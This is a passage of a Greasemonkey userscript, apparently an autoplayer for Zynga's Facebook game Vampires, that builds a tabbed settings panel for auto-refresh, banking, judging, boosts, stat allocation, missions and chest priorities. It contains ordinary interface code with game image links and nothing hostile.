        versionBox.innerHTML  = "<img src='http://www.zynga.com/images/games/gameSmall_vampires.jpg' width='116' height='48'/><strong> "+SCRIPT.version+" (game r." +gameVersion+") </strong>";

	var coffinMenu = makeElement('div', settingsBox,{'style':'position: absolute; left:160px; color: #FFFFFF;', 'id':'coffinMenu'});
        coffinMenu.innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/coffin_se.png' alt='Coffin' title='Coffin Tab'/>";
		coffinMenu.addEventListener('click', coffinMenuSelect, false);



	var clanMenu = makeElement('div', settingsBox,{'style':'position: absolute; left:240px; color: #FFFFFF;', 'id':'clanMenu'});
        clanMenu.innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/clan_se.png' alt='Coffin' title='Clan Tab'/>";
		clanMenu.addEventListener('click', clanMenuSelect, false);



	var missionMenu = makeElement('div', settingsBox,{'style':'position: absolute; left:320px; color: #FFFFFF;', 'id':'missionMenu'});
        missionMenu.innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/missions_us.png' alt='Missions' title='Missions Tab'/>";
		missionMenu.addEventListener('click', missionMenuSelect, false);

	var combatMenu = makeElement('div', settingsBox,{'style':'position: absolute; left:400px; color: #FFFFFF;', 'id':'combatMenu'});
        combatMenu.innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/combat_us.png' alt='Combat' title='Combat Tab'/>";
		combatMenu.addEventListener('click', combatMenuSelect, false);

	var bazaarMenu = makeElement('div', settingsBox,{'style':'position: absolute; left:480px; color: #FFFFFF;', 'id':'bazaarMenu'});
        bazaarMenu.innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/bazaar_us.png' alt='Bazaar' title='Bazaar Tab'/>";
		bazaarMenu.addEventListener('click', bazaarMenuSelect, false);

	var eldersMenu = makeElement('div', settingsBox,{'style':'position: absolute; left:560px; color: #FFFFFF;', 'id':'eldersMenu'});
        eldersMenu.innerHTML  = "<img src='http://facebook6.vampires.static.zynga.com/graphics/ui/elders_us.png' alt='Elders' title='Elders Tab'/>";
		eldersMenu.addEventListener('click', eldersMenuSelect, false);

// Automate Special Events
	if(eventActive) {
		var eventMenu = makeElement('div', settingsBox,{'style':'position: absolute; left:640px; color: #FFFFFF;', 'id':'eventMenu'});
		eventMenu.innerHTML  = "<div style='color:#FFE6E6;background-color:#330000;text-align:center'><table border='0'><tr><td>"+eventImageHTML+"</td><td>Event:<br>"+eventName+"</td></tr></table></div>";
			eventMenu.addEventListener('click', eventMenuSelect, false);
	}


/* Coffin tab*/		
	var coffinTab = makeElement('div', settingsBox,{'style':'position: absolute; top: 100px; width: 748px; height: 415px; color: #FFFFFF; ', 'id':'coffinTab'});
		
	var autoClick = makeElement('div', coffinTab,{'style':'position: absolute; left:40px;  top: 0px; color: #FFFFFF;'});
        autoClick.innerHTML  = "<input type='checkbox' id='autoClick' value='checked' "+GM_getValue('autoClick', '')+">enable auto-refresh";

	var refreshTimes = makeElement('div', coffinTab,{'style':'position: absolute; left:40px;  top: 25px; color: #FFFFFF;'});
		refreshTimes.innerHTML = "refresh every <input type='text' style='border: none; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('r1', '30') + "' id='r1' size='1'>";
		refreshTimes.innerHTML += " to <input type='text' style='border: none; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('r2', '110') + "'id='r2' size='1'> seconds";

	var refreshPage = makeElement('div', coffinTab,{'style':'position: absolute; left:40px;  top: 50px; color: #FFFFFF;'});
		refreshPage.innerHTML = "url: <input type='text' style='border: none; width: 270px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('refreshPage', '/index.php') + "' id='refreshPage' size='200'>";

	var autoClan = makeElement('div', coffinTab,{'style':'position: absolute; left:40px;  top: 75px; color: #FFFFFF;'});
        autoClan.innerHTML  = "<input type='checkbox' id='autoClan' value='checked' "+GM_getValue('autoClan', 'checked')+">auto accept clan invites";


// edit:032910 (zysfryar) added mission priority checkbox 
	var missionPrio = makeElement('div', coffinTab,{'style':'position: absolute; left:40px; top: 100px; color: #FFFFFF;'});
	missionPrio.innerHTML = "<input type='checkbox' id='missionPriority' value='checked' "+GM_getValue('missionPriority', 'checked')+">Prioritize Missions over Combat";
		
    // var autoTreasure = makeElement('div', coffinTab,{'style':'position: absolute; left:300px;  top: 150px; color: #FFFFFF;'});
        // autoTreasure.innerHTML  = "<input type='checkbox' id='autoTreasure' value='checked' "+GM_getValue('autoTreasure', 'checked')+">enable opening Treasure Chest";
		
    var autoBank = makeElement('div', coffinTab,{'style':'position: absolute; left:40px;  top: 125px; color: #FFFFFF;'});
        autoBank.innerHTML  = "<input type='checkbox' id='autoBank' value='checked' "+GM_getValue('autoBank', '')+">enable auto-Bank";

    var bankConfig = makeElement('div', coffinTab,{'style':'position: absolute; left:40px;  top: 150px; color: #FFFFFF;'});
		bankConfig.innerHTML = "above: <input type='text' style='border: none; width: 100px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('bankConfig', '100000') + "' id='bankConfig' size='8'>"+"<br>&nbsp;keep:&nbsp;&nbsp;<input type='text' style='border: none; width: 100px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('bankKeep', '50000') + "' id='bankKeep' size='8'>";

   var autoJudge = makeElement('div', coffinTab,{'style':'position: absolute; left:280px;  top: 0px; color: #FFFFFF;'});
        autoJudge.innerHTML  = "<input type='checkbox' id='autoJudge' value='checked' "+GM_getValue('autoJudge', '')+">auto-Judge";
	autoJudge.innerHTML += "#: <input type='text' style='border: none; width: 50px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('JudgeCount', 0) + "' id='JudgeCount' size='20'>";

	var JudgeRating = makeElement('select', coffinTab, {'style':'position: absolute; top: 25px; left:280px;', 'id':'JudgeRating'});
		for each (var rating in ratings )
		{
			var choice = document.createElement('option');
			choice.value = rating;
			choice.appendChild(document.createTextNode(rating));
			JudgeRating.appendChild(choice);
		}
		JudgeRating.selectedIndex = GM_getValue('JudgeRating', 1);

	var JudgeComment  = makeElement('div', coffinTab,{'style':'position: absolute; left:280px;  top: 50px; color: #FFFFFF;'});
// Modification of Automatic Periodic Judging to allow for configurable parameters in the settings screens
// Making some room for additional parameters, reducing the size of the Judge Comment block (height from 100px to 50px).
		JudgeComment.innerHTML  = "Comment:<br/><textarea style='border: none; background-color: white; color: #AA0000; width: 180px; height: 50px;' id='JudgeComment'>" + GM_getValue('JudgeComment', 'tasty') + "</textarea>";

// Modification of Automatic Periodic Judging to allow for configurable parameters in the settings screens
   var autoPeriodicJudge = makeElement('div', coffinTab,{'style':'position: absolute; left:280px;  top: 125px; color: #FFFFFF;'});
        autoPeriodicJudge.innerHTML  = "<input type='checkbox' id='autoPeriodicJudge' value='checked' "+GM_getValue('autoPeriodicJudge', '')+">Periodic Auto-Judging";

    var autoJudgeTimerIndexMax = makeElement('div', coffinTab,{'style':'position: absolute; left:280px;  top: 150px; color: #FFFFFF;'});
	autoJudgeTimerIndexMax.innerHTML = "Delay: <input type='text' style='border: none; width: 162px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoJudgeTimerIndexMax', '15') + "' id='autoJudgeTimerIndexMax' size='4' title='Number of actions Autoplayer will take before switching to Auto-Judge mode'>"+"<br># Judgements: <input type='text' style='border: none; width: 50px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoJudgeCount', '10') + "' id='autoJudgeCount' size='4'>";


// Automatically use boosts		
   var autoBoostsDiv = makeElement('div', coffinTab,{'style':'position: absolute; left:470px;  top: 0px; color: #FFFFFF;'});
        autoBoostsDiv.innerHTML  = "Use boosts";
   var autoBoostsMinDiv = makeElement('div', coffinTab,{'style':'position: absolute; left:580px;  top: 0px; color: #FFFFFF;'});
        autoBoostsMinDiv.innerHTML  = "Use @";
   var autoBoostsKeepDiv = makeElement('div', coffinTab,{'style':'position: absolute; left:635px;  top: 0px; color: #FFFFFF;'});
        autoBoostsKeepDiv.innerHTML  = "Keep";
   var autoBoostsKeepDiv = makeElement('div', coffinTab,{'style':'position: absolute; left:690px;  top: 0px; color: #FFFFFF;'});
        autoBoostsKeepDiv.innerHTML  = "Min BM";

   var autoBoostRage = makeElement('div', coffinTab,{'style':'position: absolute; left:470px;  top: 25px; color: #FFFFFF;'});
        autoBoostRage.innerHTML  = "<input type='checkbox' id='autoBoostRage' value='checked' "+GM_getValue('autoBoostRage', '')+"><img src='http://facebook6.vampires.static.zynga.com/64458/graphics/boost_rage.gif' alt='' width='15' height='15' title='50% Rage Boost' border='0'>50% Rage";
   var autoBoostRageMin = makeElement('div', coffinTab,{'style':'position: absolute; left:585px;  top: 25px; color: #FFFFFF;'});
        autoBoostRageMin.innerHTML  = "<input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoBoostRageMin', '0') + "' id='autoBoostRageMin' size='1' title='Boost will be used if Rage drops below this value'>";
   var autoBoostRageKeep = makeElement('div', coffinTab,{'style':'position: absolute; left:635px;  top: 25px; color: #FFFFFF;'});
        autoBoostRageKeep.innerHTML  = "<input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoBoostRageKeep', '0') + "' id='autoBoostRageKeep' size='1' title='Keep this number of Rage boosts for manual use'>";

   var autoBoostFiftyNrg = makeElement('div', coffinTab,{'style':'position: absolute; left:470px;  top: 50px; color: #FFFFFF;'});
        autoBoostFiftyNrg.innerHTML  = "<input type='checkbox' id='autoBoostFiftyNrg' value='checked' "+GM_getValue('autoBoostFiftyNrg', '')+"><img src='http://facebook6.vampires.static.zynga.com/64458/graphics/deadbull.png' alt='' width='15' height='15' title='50% Energy Boost' border='0'>50% Energy";
   var autoBoostFiftyNrgMin = makeElement('div', coffinTab,{'style':'position: absolute; left:585px;  top: 50px; color: #FFFFFF;'});
        autoBoostFiftyNrgMin.innerHTML  = "<input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoBoostFiftyNrgMin', '0') + "' id='autoBoostFiftyNrgMin' size='1' title='Boost will be used if Energy drops below this value'>";
   var autoBoostFiftyNrgKeep = makeElement('div', coffinTab,{'style':'position: absolute; left:635px;  top: 50px; color: #FFFFFF;'});
        autoBoostFiftyNrgKeep.innerHTML  = "<input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoBoostFiftyNrgKeep', '0') + "' id='autoBoostFiftyNrgKeep' size='1' title='Keep this number of 50% Energy boosts for manual use'>";

   var autoBoostHundredNrg = makeElement('div', coffinTab,{'style':'position: absolute; left:470px;  top: 75px; color: #FFFFFF;'});
        autoBoostHundredNrg.innerHTML  = "<input type='checkbox' id='autoBoostHundredNrg' value='checked' "+GM_getValue('autoBoostHundredNrg', '')+"><img src='http://facebook6.vampires.static.zynga.com/64458/graphics/deadbull.png' alt='' width='15' height='15' title='100% Energy Boost' border='0'>100% Energy";
   var autoBoostHundredNrgMin = makeElement('div', coffinTab,{'style':'position: absolute; left:585px;  top: 75px; color: #FFFFFF;'});
        autoBoostHundredNrgMin.innerHTML  = "<input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoBoostHundredNrgMin', '0') + "' id='autoBoostHundredNrgMin' size='1' title='Boost will be used if Energy drops below this value'>";
   var autoBoostHundredNrgKeep = makeElement('div', coffinTab,{'style':'position: absolute; left:635px;  top: 75px; color: #FFFFFF;'});
        autoBoostHundredNrgKeep.innerHTML  = "<input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoBoostHundredNrgKeep', '0') + "' id='autoBoostHundredNrgKeep' size='1' title='Keep this number of 100% Energy boosts for manual use'>";

   var autoBoostWaste = makeElement('div', coffinTab,{'style':'position: absolute; left:470px;  top: 100px; color: #FFFFFF;'});
        autoBoostWaste.innerHTML  = "Waste Allowed: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoBoostWaste', '0') + "' id='autoBoostWaste' size='1' title='Percentage of Exp waste allowed at level (0% for no waste, 100% to use boosts right up to level)'>%";

   var autoBoostHealth = makeElement('div', coffinTab,{'style':'position: absolute; left:470px;  top: 125px; color: #FFFFFF;'});
        autoBoostHealth.innerHTML  = "<input type='checkbox' id='autoBoostHealth' value='checked' "+GM_getValue('autoBoostHealth', '')+"><img src='http://facebook6.vampires.static.zynga.com/64458/graphics/deadbull.png' alt='' width='15' height='15' title='100% Energy Boost' border='0'>Health";
   var autoBoostHealthMin = makeElement('div', coffinTab,{'style':'position: absolute; left:585px;  top: 125px; color: #FFFFFF;'});
        autoBoostHealthMin.innerHTML  = "<input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoBoostHealthMin', '20') + "' id='autoBoostHealthMin' size='1' title='Boost will be used if Health drops below this value and \"You cannot heal so fast!\" message is detected'>";
   var autoBoostHealthKeep = makeElement('div', coffinTab,{'style':'position: absolute; left:635px;  top: 125px; color: #FFFFFF;'});
        autoBoostHealthKeep.innerHTML  = "<input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('autoBoostHealthKeep', '0') + "' id='autoBoostHealthKeep' size='1' title='Keep this number of 100% Energy boosts for manual use'>";

   var autoBoostRageMinGG = makeElement('select', coffinTab, {'style':'position: absolute; left:680px; top: 25px;', 'id':'autoBoostRageMinGG', 'title':'Rage Boost will not be used unless your Glyph of Guile Blood Magic is at or higher than this percentage'});
	for each (var GGStrOption in GGStrOptions )
	{
		var choice = document.createElement('option');
		choice.value = GGStrOption;
		choice.appendChild(document.createTextNode(GGStrOption));
		autoBoostRageMinGG.appendChild(choice);
	}
	autoBoostRageMinGG.selectedIndex = GM_getValue('autoBoostRageMinGG', 0);

   var autoBoostNRGMinGW = makeElement('select', coffinTab, {'style':'position: absolute; left:680px; top: 50px;', 'id':'autoBoostNRGMinGW', 'title':'Energy Boost will not be used unless your Glyph of Wisdom Blood Magic is at or higher than this percentage'});
	for each (var GWStrOption in GWStrOptions )
	{
		var choice = document.createElement('option');
		choice.value = GWStrOption;
		choice.appendChild(document.createTextNode(GWStrOption));
		autoBoostNRGMinGW.appendChild(choice);
	}
	autoBoostNRGMinGW.selectedIndex = GM_getValue('autoBoostNRGMinGW', 0);


// Auto-stats parameters - borrowed from MWAP

  var statDiv = makeElement('div', coffinTab, {'style':'position: absolute; width: 100%; left: 40px; top: 200px;'});

  var autoStats = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; left: 0px;'});
  makeElement('input', autoStats, {'type':'checkbox', 'id':'autoStats', 'value':'checked'}, 'autoStats');
  makeElement('label', autoStats, {'for':'autoStats', 'title':'Check this to enable auto-statting'}).appendChild(document.createTextNode(' Enable auto-stat'));

  var divStatDisable = makeElement('div', statDiv, {'style':'position: absolute; text-align: left; left: 200px; '});
  makeElement('input', divStatDisable, {'type':'checkbox', 'id':'autoStatDisable', 'title':'Disable AutoStat when status goals are reached', 'value':'checked'}, 'autoStatDisable');
  makeElement('label', divStatDisable, {'for':'autoStatDisable', 'title':'Disable AutoStat when status goals are reached'}).appendChild(document.createTextNode('Disable AutoStat when status goals are reached'));

  // Display Adjustments
  var xTop = 30;
  var yLeft = 10;

  // Status Labels
  var yLeftCur = yLeft + 20;
  var xTopCur = xTop +2;

  // Stat labels
  for (i = 0, iLength=autoStatRatios.length; i < iLength; ++i ) {
    div = makeElement('div', statDiv, {'style':'position: absolute; top:' + xTopCur + 'px; left:' + yLeftCur + 'px;'});
    div.appendChild(document.createTextNode(autoStatDescrips[i + 1]));

    xTopCur += 25;
  }

  // Status ratio
  yLeftCur = yLeft + 75;
  xTopCur = xTop;

  for (i = 0, iLength=autoStatRatios.length; i < iLength; ++i ) {
    title = 'Please set ratio of ' + autoStatDescrips[i + 1] + ' stat';
    id = autoStatRatios[i];
    div = makeElement('div', statDiv, {'style':'position: absolute; top:' + xTopCur + 'px; left:' + yLeftCur + 'px;', 'title':title});
    div.appendChild(document.createTextNode(' = '));
    makeElement('input', div, {'type':'text', 'style':'width: 40px;', 'value':GM_getValue(id, 0), 'id':id, 'size':'1'});
    div.appendChild(document.createTextNode(' x '));

    xTopCur += 25;
  }


  // Status Allocation Mode Settings
  yLeftCur = yLeft + 150;
  xTopCur = xTop;

  for (i = 0, iLength=autoStatModes.length; i < iLength; ++i ) {
    title = 'Please select where to base ' + autoStatDescrips[i + 1] + ' stat';
    id = autoStatModes[i];
    var sel = makeElement('select', statDiv, {'id':id, 'title':title, 'style':'position: absolute; width:60px; top: ' + xTopCur + 'px; left: ' + yLeftCur + 'px;'});
    xTopCur += 25;
    for (j = 0, jLength=autoStatDescrips.length; j < jLength; ++j) {
      choice = document.createElement('option');
      choice.value = j;
      choice.appendChild(document.createTextNode(autoStatDescrips[j]));
      sel.appendChild(choice);
    }
    sel.selectedIndex = GM_getValue(autoStatModes[i], 0);
  }

  // Status base
  yLeftCur = yLeft + 215;
  xTopCur = xTop;

  for (i = 0, iLength=autoStatBases.length; i < iLength; ++i ) {
    title = 'add these for total ';
    id = autoStatBases[i];
    div = makeElement('div', statDiv, {'style':'position: absolute; top:' + xTopCur + 'px; left:' + yLeftCur + 'px;', 'title':title});
    div.appendChild(document.createTextNode(' + '));
    makeElement('input', div, {'type':'text', 'style':'width: 40px;', 'value':GM_getValue(id, 0), 'id':id, 'size':'1'});
    xTopCur += 25;
  }

  // Left-over points
  yLeftCur = yLeft + 280;
  xTopCur = xTop;

  for (i = 0, iLength=autoStatFallbacks.length; i < iLength; ++i ) {
    title = 'Check this to distribute points to ' + autoStatDescrips[i + 1] + ' when goals are reached';
    id = autoStatFallbacks[i];
    div = makeElement('div', statDiv, {'style':'position: absolute; top: ' + xTopCur + 'px; left:' + yLeftCur + 'px; '});
    makeElement('input', div, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, autoStatFallbacks[i]);
    label = makeElement('label', div, {'for':id, 'title':title});
    label.appendChild(document.createTextNode(' ' + autoStatDescrips[i+1] + ' as fallback'));
    xTopCur += 25;
  }

  // Priority Settings
  title = 'Please select priority level for stat distribution';
  yLeftCur = yLeft + 460;
  xTopCur = xTop;

  for (i = 0, iLength=autoStatPrios.length; i < iLength; ++i ) {
    id = autoStatPrios[i];
    sel = makeElement('select', statDiv, {'id':id, 'title':title,'style':'position: absolute; top: ' + xTopCur + 'px; left: ' + yLeftCur + 'px;'});
    xTopCur += 25;
    for (j = 0, jLength=autoStatRatios.length; j < jLength; ++j) {
      choice = document.createElement('option');
      choice.value = j;
      choice.appendChild(document.createTextNode('Priority ' + (j + 1)));
      sel.appendChild(choice);
    }
    sel.selectedIndex = GM_getValue(autoStatPrios[i], 0);
  }

		
/* Clan tab*/		
	var clanTab = makeElement('div', settingsBox,{'style':'position: absolute; top: 100px; width: 748px; height: 415px; color: #FFFFFF; visibility:hidden;', 'id':'clanTab'});

	var clanList = makeElement('div', clanTab,{'style':'position: absolute; left:40px;  top: 0px; color: #FFFFFF;'});
		clanList.innerHTML  = "<strong>Favored Clan List:</strong><br/><textarea style='border: none; background-color: transparent; color: #AA0000; width: 180px; height: 300px;' id='clanList'>" + GM_getValue('clanList', '') + "</textarea>";

	var clanJudgeFC = makeElement('div', clanTab,{'style':'position: absolute; left:230px;  top: 0px; color: #FFFFFF;'});
        	clanJudgeFC.innerHTML  = "<input type='checkbox' id='clanJudgeFC' value='checked' "+GM_getValue('clanJudgeFC', 'checked')+">Judge Favored Clan once/day";

	var clanJudgeRating = makeElement('select', clanTab, {'style':'position: absolute; top: 25px; left:230px;', 'id':'clanJudgeRating'});
		for each (var rating in ratings )
		{
			var choice = document.createElement('option');
			choice.value = rating;
			choice.appendChild(document.createTextNode(rating));
			clanJudgeRating.appendChild(choice);
		}
		clanJudgeRating.selectedIndex = GM_getValue('clanJudgeRating', 1);


	var clanJudgeCommentOn = makeElement('div', clanTab,{'style':'position: absolute; left:230px;  top: 50px; color: #FFFFFF;'});
        	clanJudgeCommentOn.innerHTML  = "<input type='checkbox' id='clanJudgeCommentOn' value='checked' "+GM_getValue('clanJudgeCommentOn', 'checked')+">Leave Comment";
        	clanJudgeCommentOn.addEventListener('click', clanJudgeCommentToggle, false);

	var clanJudgeComment  = makeElement('div', clanTab,{'style':'position: absolute; left:230px;  top: 75px; color: #FFFFFF;'});
		clanJudgeComment.innerHTML  = "Comment:<br/><textarea style='border: none; background-color: white; color: #AA0000; width: 180px; height: 35px;' id='clanJudgeComment'>" + GM_getValue('clanJudgeComment', 'tasty') + "</textarea>";
        	clanJudgeCommentToggle();


    	
	var dumpClanJudgeHistoryButton = makeElement('div', clanTab,{'style':'position: absolute; left:230px;  top: 135px; color: #FFFFFF;'});
        	dumpClanJudgeHistoryButton.innerHTML  = "<button>Show Judge History in Log</button>";
        	dumpClanJudgeHistoryButton.addEventListener('click', dumpClanJudgedList, false);
    	
	var clearClanJudgeHistoryButton = makeElement('div', clanTab,{'style':'position: absolute; left:230px;  top: 160px; color: #FFFFFF;'});
        	clearClanJudgeHistoryButton.innerHTML  = "<button>Clear Judge History</button>";
        	clearClanJudgeHistoryButton.addEventListener('click', clearClanJudgedList, false);


	// Clan Judge Limits:
	var clanJudgeLimitHeader = makeElement('div', clanTab,{'style':'position: absolute; left:470px;  top: 10px; color: #FFFFFF;'});
		clanJudgeLimitHeader.innerHTML  = "Clan Judge Limit:";

	var clanJudgeLimitTimeT1toT2 = makeElement('div', clanTab,{'style':'position: absolute; left:470px;  top: 30px; color: #FFFFFF;'});
		clanJudgeLimitTimeT1toT2.innerHTML  = "<input type='checkbox' id='clanJudgeLimitTimeT1toT2' value='checked' " + GM_getValue('clanJudgeLimitTimeT1toT2', 'checked') + "> Between \
		<input type='text' style='border: none; width: 35px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('clanJudgeLimitTimeT1Time', '00:00') + "' id='clanJudgeLimitTimeT1Time' size='3' title='Time MUST be formatted in HH:MM!'>\
		&amp; <input type='text' style='border: none; width: 35px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('clanJudgeLimitTimeT2Time', '01:00') + "' id='clanJudgeLimitTimeT2Time' size='3' title='Time MUST be formatted in HH:MM!'>\
		";
//		<br>&nbsp;&nbsp;&nbsp;AND";
//
//	var clanJudgeLimitTimeT3toT4 = makeElement('div', clanTab,{'style':'position: absolute; left:470px;  top: 65px; color: #FFFFFF;'});
//		clanJudgeLimitTimeT3toT4.innerHTML  = "<input type='checkbox' id='clanJudgeLimitTimeT3toT4' value='checked' " + GM_getValue('clanJudgeLimitTimeT3toT4', 'checked') + "> Between \
//		<input type='text' style='border: none; width: 35px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('clanJudgeLimitTimeT3Time', '13:00') + "' id='clanJudgeLimitTimeT3Time' size='3' title='Time MUST be formatted in HH:MM!'>\
//		&amp; <input type='text' style='border: none; width: 35px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('clanJudgeLimitTimeT4Time', '14:00') + "' id='clanJudgeLimitTimeT4Time' size='3' title='Time MUST be formatted in HH:MM!'>";



/* Mission tab*/		
	var missionTab = makeElement('div', settingsBox,{'style':'position: absolute; top: 100px; width: 748px; height: 415px; color: #FFFFFF; visibility:hidden;', 'id':'missionTab'});

	var autoMission = makeElement('div', missionTab,{'style':'position: absolute; left:40px;  top: 0px; color: #FFFFFF;'});
        	autoMission.innerHTML  = "<input type='checkbox' id='autoMission' value='checked' "+GM_getValue('autoMission', 'checked')+">enable auto-Mission";

	var selectMission = makeElement('select', missionTab, {'style':'position: absolute; top: 25px; left:40px;', 'id':'selectMission'});
		for each (var mission in missions )
		{
			if (mission[3]==0) {
				//Tab header creation
				var choiceTab = document.createElement('optgroup');
				tabtocreate = mission[2];
				choiceTab.label = missionTabs[tabtocreate];
				choiceTab.setAttribute("style","background-color: #CCCCCC");
				selectMission.appendChild(choiceTab);
			}				
			
			var choice = document.createElement('option');
			choice.value = mission[0];
			choice.appendChild(document.createTextNode(mission[0]));
			selectMission.appendChild(choice);
		}
		selectMission.selectedIndex = GM_getValue('selectMission', 1);

// User changable parameter to include missionExpGain (the average Exp gained per Energy) - used to calculate when to use Energy Buff
	var missionExpGain = makeElement('div', missionTab,{'style':'position: absolute; left:40px;  top: 50px; color: #FFFFFF;'});
		missionExpGain.innerHTML = "Avg. Mission Exp Gain: <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('missionExpGain', '1.5') + "' id='missionExpGain' size='1'>";

// Exp Reserve
	var missionExpReserve = makeElement('div', missionTab,{'style':'position: absolute; left:40px;  top: 75px; color: #FFFFFF;'});
		missionExpReserve.innerHTML = "Reserve <input type='text' style='border: none; width: 30px; text-align: center; background-color: transparent; color: #AA0000;' value='" + GM_getValue('missionExpReserve', '0') + "' id='missionExpReserve' size='1'> Exp for Manual Play";

	var showExpNrgRatio = makeElement('div', missionTab,{'style':'position: absolute; left:40px;  top: 100px; color: #FFFFFF;'});
        	showExpNrgRatio.innerHTML  = "<input type='checkbox' id='showExpNrgRatio' value='checked' "+GM_getValue('showExpNrgRatio', 'checked')+">Show Exp:Energy Ratio below Exp to Level";

	var missionMastery = makeElement('div', missionTab,{'style':'position: absolute; left:250px;  top: 0px; color: #FFFFFF;'});
		missionMastery.innerHTML  = "<input type='checkbox' id='missionMastery' value='checked' "+GM_getValue('missionMastery', 'checked')+">Force mission Mastery";















// Ancient Chest configuration

//  var chestDiv = makeElement('div', missionTab, {'style':'position: absolute; width: 100%; left: 40px; top: 125px;'});
  var chestDiv = makeElement('div', missionTab, {'style':'position: absolute; width: 100%; left: 450px; top: 0px;'});

  var autoPublishAncientChests = makeElement('div', chestDiv, {'style':'position: absolute; text-align: left; left: 0px;'});
  makeElement('input', autoPublishAncientChests, {'type':'checkbox', 'id':'autoPublishAncientChests', 'value':'checked'}, 'autoPublishAncientChests');
  makeElement('label', autoPublishAncientChests, {'for':'autoPublishAncientChests', 'title':'Check this to enable automated Ancient Chest selection'}).appendChild(document.createTextNode(' Enable automatic chest selection'));


  var autoChestPrio1Text = makeElement('div', chestDiv,{'style':'position: absolute; top: 27px; left:10px;  color: #FFFFFF;','title':'Select your most desired Chest item'});
        autoChestPrio1Text.innerHTML  = "Priority 1:";
  var autoChestPrio1 = makeElement('select', chestDiv, {'style':'position: absolute; top: 25px; left:80px;', 'id':'autoChestPrio1','title':'Select your most desired Chest item'});
	for each (var autoChestDescrip in autoChestDescrips )
	{
		var choice = document.createElement('option');
		choice.value = autoChestDescrip;
		choice.appendChild(document.createTextNode(autoChestDescrip));
		autoChestPrio1.appendChild(choice);
	}
	autoChestPrio1.selectedIndex = GM_getValue('autoChestPrio1', 0);

  var autoChestPrio2Text = makeElement('div', chestDiv,{'style':'position: absolute; top: 52px; left:10px;  color: #FFFFFF;','title':'Select your 2nd most desired Chest item'});
        autoChestPrio2Text.innerHTML  = "Priority 2:";
  var autoChestPrio2 = makeElement('select', chestDiv, {'style':'position: absolute; top: 50px; left:80px;', 'id':'autoChestPrio2','title':'Select your 2nd most desired Chest item'});
	for each (var autoChestDescrip in autoChestDescrips )
	{
		var choice = document.createElement('option');
		choice.value = autoChestDescrip;
		choice.appendChild(document.createTextNode(autoChestDescrip));
		autoChestPrio2.appendChild(choice);
	}
	autoChestPrio2.selectedIndex = GM_getValue('autoChestPrio2', 1);

  var autoChestPrio3Text = makeElement('div', chestDiv,{'style':'position: absolute; top: 77px; left:10px;  color: #FFFFFF;','title':'Select your 3rd most desired Chest item'});
        autoChestPrio3Text.innerHTML  = "Priority 3:";
  var autoChestPrio3 = makeElement('select', chestDiv, {'style':'position: absolute; top: 75px; left:80px;', 'id':'autoChestPrio3','title':'Select your 3rd most desired Chest item'});
	for each (var autoChestDescrip in autoChestDescrips )
	{
		var choice = document.createElement('option');
		choice.value = autoChestDescrip;
		choice.appendChild(document.createTextNode(autoChestDescrip));
		autoChestPrio3.appendChild(choice);
	}
	autoChestPrio3.selectedIndex = GM_getValue('autoChestPrio3', 2);

  var autoChestPrio4Text = makeElement('div', chestDiv,{'style':'position: absolute; top: 102px; left:10px;  color: #FFFFFF;','title':'Select your 4th most desired Chest item'});
        autoChestPrio4Text.innerHTML  = "Priority 4:";
  var autoChestPrio4 = makeElement('select', chestDiv, {'style':'position: absolute; top: 100px; left:80px;', 'id':'autoChestPrio4','title':'Select your 4th most desired Chest item'});
	for each (var autoChestDescrip in autoChestDescrips )
	{
		var choice = document.createElement('option');
		choice.value = autoChestDescrip;
		choice.appendChild(document.createTextNode(autoChestDescrip));
		autoChestPrio4.appendChild(choice);
	}
	autoChestPrio4.selectedIndex = GM_getValue('autoChestPrio4', 3);

  var autoChestPrio5Text = makeElement('div', chestDiv,{'style':'position: absolute; top: 127px; left:10px;  color: #FFFFFF;','title':'Select your 5th most desired Chest item'});
        autoChestPrio5Text.innerHTML  = "Priority 5:";
  var autoChestPrio5 = makeElement('select', chestDiv, {'style':'position: absolute; top: 125px; left:80px;', 'id':'autoChestPrio5','title':'Select your 5th most desired Chest item'});
	for each (var autoChestDescrip in autoChestDescrips )
	{
		var choice = document.createElement('option');
		choice.value = autoChestDescrip;
		choice.appendChild(document.createTextNode(autoChestDescrip));
		autoChestPrio5.appendChild(choice);
	}
	autoChestPrio5.selectedIndex = GM_getValue('autoChestPrio5', 4);

  var autoChestPrio6Text = makeElement('div', chestDiv,{'style':'position: absolute; top: 152px; left:10px;  color: #FFFFFF;','title':'Select your 6th most desired Chest item'});
